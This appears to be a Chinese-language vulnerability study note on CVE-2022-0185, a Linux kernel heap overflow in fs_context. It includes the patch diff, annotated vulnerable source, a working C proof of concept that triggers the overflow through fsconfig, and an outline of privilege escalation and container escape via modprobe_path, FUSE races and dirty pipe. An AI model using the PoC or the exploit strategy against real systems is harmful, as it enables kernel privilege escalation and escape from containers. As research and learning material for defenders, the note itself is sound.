## CVE-2022-0185 File System Context Integer Overflow

---

### 影响

Linux-v5.1~v5.16.2。5.1-rc1 引入漏洞，Linux-v5.16.2已修补 ，由syzkaller发现。评分8.4分

- 内核编译 y
```config
CONFIG_CHECKPOINT_RESTORE
CONFIG_USER_NS
CONFIG_FUSE
CONFIG_SYSVIPC
CONFIG_USERFAULTFD

CONFIG_E1000
CONFIG_E1000E
```

### 原理

内核的 File System Context 模块（文件系统环境）的fs/fs_context.c文件中存在整数溢出导致堆溢出。
攻击者必须具备 CAP_SYS_ADMIN 权限(允许执行系统管理任务)，或者使用命名空间或者使用unshare(CLONE_NEWNS|CLONE_NEWUSER) （等同于命令$ unshare -Urm: unshare命令是在Linux系统上使用的一个工具，允许创建和管理新的命名空间。）来进入含有CAP_SYS_ADMIN权限的命名空间。
docker中默认没有CAP_SYS_ADMIN权限（启用容器时需使用 “-privileged” 选项），且docker的seccomp过滤会默认拦截 unshare 命令，所以docker中无法利用；但是 Kubernetes 集群在使用docker时，seccomp 过滤默认是禁用的，可以提权和逃逸。

- [patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de2)
> The `PAGE_SIZE - 2 - size` calculation in legacy_parse_param() is an
**unsigned type** so a large value of "size" results in a high positive
value instead of a negative value as expected.  Fix this by getting rid
of the subtraction.

```bash
diff --git a/fs/fs_context.c b/fs/fs_context.c
index b7e43a780a625..24ce12f0db32e 100644
--- a/fs/fs_context.c
+++ b/fs/fs_context.c
@@ -548,7 +548,7 @@ static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
 			      param->key);
 	}
 
-	if (len > PAGE_SIZE - 2 - size)
+	if (size + len + 2 > PAGE_SIZE)
 		return invalf(fc, "VFS: Legacy: Cumulative options too large");
 	if (strchr(param->key, ',') ||
 	    (param->type == fs_value_is_string &&
```

#### 源码

```c
static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
{
    struct legacy_fs_context *ctx = fc->fs_private;
    unsigned int size = ctx->data_size;
    size_t len = 0;

    if (strcmp(param->key, "source") == 0) {
        if (param->type != fs_value_is_string)
            return invalf(fc, "VFS: Legacy: Non-string source");
        if (fc->source)
            return invalf(fc, "VFS: Legacy: Multiple sources");
        fc->source = param->string;
        param->string = NULL;
        return 0;
    }

    if (ctx->param_type == LEGACY_FS_MONOLITHIC_PARAMS)
        return invalf(fc, "VFS: Legacy: Can't mix monolithic and individual options");

    switch (param->type) {
    case fs_value_is_string:
        len = 1 + param->size;
        fallthrough;
    case fs_value_is_flag:
        len += strlen(param->key);
        break;
    default:
        return invalf(fc, "VFS: Legacy: Parameter type for '%s' not supported",
                  param->key);
    }

    if (len > PAGE_SIZE - 2 - size)   // vuln => unsigned type 
        return invalf(fc, "VFS: Legacy: Cumulative options too large");
    if (strchr(param->key, ',') ||
        (param->type == fs_value_is_string &&
         memchr(param->string, ',', param->size)))
        return invalf(fc, "VFS: Legacy: Option '%s' contained comma",
                  param->key);
    if (!ctx->legacy_data) {
        ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
        if (!ctx->legacy_data)
            return -ENOMEM;
    }

    ctx->legacy_data[size++] = ',';          // append，新的内容会追加
    len = strlen(param->key);
    memcpy(ctx->legacy_data + size, param->key, len);  // memcpy key
    size += len;
    if (param->type == fs_value_is_string) {
        ctx->legacy_data[size++] = '=';
        memcpy(ctx->legacy_data + size, param->string, param->size);  // OOB write
        size += param->size;
    }
    ctx->legacy_data[size] = '\0';
    ctx->data_size = size;
    ctx->param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
    return 0;
}
```

- `PAGE_SIZE - 2 - size` 结果是一个无符号数，当size比较大时会产生溢出，导致后面的逻辑可以执行。使 `memcpy` 时导致 `len` 长度溢出，从而导致堆溢出。
- memcpy 不会被 \0 截断，strlen 会截断
- 传递消息，形成 `,key=value` 的形式，因为我们传递key为 `\x00`，因此相当于在每次内容前加入了 `,=` 字符串

### poc

poc.c: 也需要 `CAP_SYS_ADMIN` 权限才能使用

```c
#define _GNU_SOURCE
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)

int main(void)
{
        char* val = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        int fd = 0;
        fd = fsopen("9p", 0);
        if (fd < 0) {
                puts("Opening");
                exit(-1);
        }
        for (int i = 0; i < 5000; i++) {
                fsconfig(fd, FSCONFIG_SET_STRING, "\x00", val, 0);
        }
        return 0;
}
```

## 漏洞利用

漏洞利用链
__x64_sys_fsconfig() -> vfs_fsconfig_locked() -> vfs_parse_fs_param() -> legacy_parse_param()

- 调用 fsconfig 需传入 FSCONFIG_SET_STRING 和两个字符串 key / value，最后一个参数必须为0
    - 填充 key。然后根据 `FSCONFIG_SET_STRING` 调用 vfs_fsconfig_locked 函数，然后调用链形成


### fuse 学习

[fuse.md](../0x01%20Template/race/fuse.md)

### exploit

几乎没有限制的堆溢出的利用

#### change modprobe_path

1. kmalloc 的size为 `PAGE_SIZE (大部分0x1000)`，flags为`GFP_KERNEL` 也是比较大，因此使用 msg_msg 结构体。
2. 泄露内核地址，使用 `seq_ops(0x20)` 因此将 msg 大小设置为 0x1000-0x30+0x20+0x8(page_size-msg_msg_head+seq_ops+msg_msgseg_size) = 0xfe8，同时堆喷射大量的 seq_ops。
    a. 当然，我们也可以使用其余的结构体
3. 触发堆溢出，修改 m_ts 大小，越界读，从而泄露函数地址。
4. 条件竞争造成任意地址写：fuse 稳定竞争
    a. 分配一个消息
    b. 访问消息，触发页错误暂停（msgsnd 中的copy_from_user 发生缺页中断）。
    c. 分配第二个消息
    d. 覆盖第一个消息next指针，为 modprobe_path。
    e. 将我们的数据拷贝的next指针地方

漏洞利用前的准备： 
(1). pipe 用作同步消息
(2). fuse
(3). modprobe_path

#### KCTF

***todo !!!***

### 另一种利用方式

- 来自于 veritas501 师傅的博客

1. 不使用竞争，使用 msg_msg leak 堆地址从而进行uaf的利用，类似于CVE-2021-22555
2. **结合`dirty pipe`，这样我们就不用绕过那些烦人的保护了**
在kernel >= 5.8中，我们只需修改pipe_buffer中splice页的flag |= PIPE_BUF_FLAG_CAN_MERGE即可（有能力可以顺便把offset和len改成0，这样就能从文件的开头开始写）；在kernel < 5.8中，需要先leak一下pipe_buffer中的anon_pipe_ops，然后将splice页的的ops改为anon_pipe_ops（因为<5.8版本中能否merge是看ops的）（有能力依然可以顺便把offset和len改成0）。


## 缓解机制

***todo !!!***

- 可能需要修改一下偏移，将其偏移改成本机的

## 复现

- apt 安装的 libfuse 和 [official](https://github.com/libfuse/libfuse) 有些功能不一样，我们选择官方的，这样一些模板就可以直接使用。
- 当然，我们还可以使用本机自带的  ***todo !!!***

```c
// main 函数
int fuse_main_compat2(int argc, char *argv[],
		      const struct fuse_operations_compat2 *op);

// ops，少了很多方式，是不是不用写了！？
struct fuse_operations_compat2 {
	int (*getattr)	   (const char *, struct stat *);
	int (*readlink)	   (const char *, char *, size_t);
	int (*getdir)	   (const char *, fuse_dirh_t, fuse_dirfil_t_compat);
	int (*mknod)	   (const char *, mode_t, dev_t);
	int (*mkdir)	   (const char *, mode_t);
	int (*unlink)	   (const char *);
	int (*rmdir)	   (const char *);
	int (*symlink)	   (const char *, const char *);
	int (*rename)	   (const char *, const char *);
	int (*link)	   (const char *, const char *);
	int (*chmod)	   (const char *, mode_t);
	int (*chown)	   (const char *, uid_t, gid_t);
	int (*truncate)	   (const char *, off_t);
	int (*utime)	   (const char *, struct utimbuf *);
	int (*open)	   (const char *, int);
	int (*read)	   (const char *, char *, size_t, off_t);
	int (*write)	   (const char *, const char *, size_t, off_t);
	int (*statfs)	   (const char *, struct statfs *);
	int (*flush)	   (const char *);
	int (*release)	   (const char *, int);
	int (*fsync)	   (const char *, int);
	int (*setxattr)	   (const char *, const char *, const char *,
			    size_t, int);
	int (*getxattr)	   (const char *, const char *, char *, size_t);
	int (*listxattr)   (const char *, char *, size_t);
	int (*removexattr) (const char *, const char *);
};
```

## 参考文章

- [willroot cve-2022-0185](https://www.willsroot.io/2022/01/cve-2022-0185.html)
- [bsauce cve-2022-0185](https://bsauce.github.io/2022/04/08/CVE-2022-0185/)
- [xz cve-2022-0185](https://xz.aliyun.com/t/11031)
- [xi4oyu cve-2022-0185](https://www.xi4oyu.top/4161b49f/)
- [chenaotian cve-2022-0185](https://github.com/chenaotian/CVE-2022-0185)
- [veritas501 cve-2022-0185](https://veritas501.github.io/2022_03_16-CVE_2022_0185%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E4%B8%8Epipe%E6%96%B0%E5%8E%9F%E8%AF%AD%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/)
- [pipe-primitive](https://github.com/veritas501/pipe-primitive)
- [fuse 101](https://exploiter.dev/blog/2022/FUSE-exploit.html)
- [Breeze_CAT](https://blog.csdn.net/Breeze_CAT/article/details/123007818)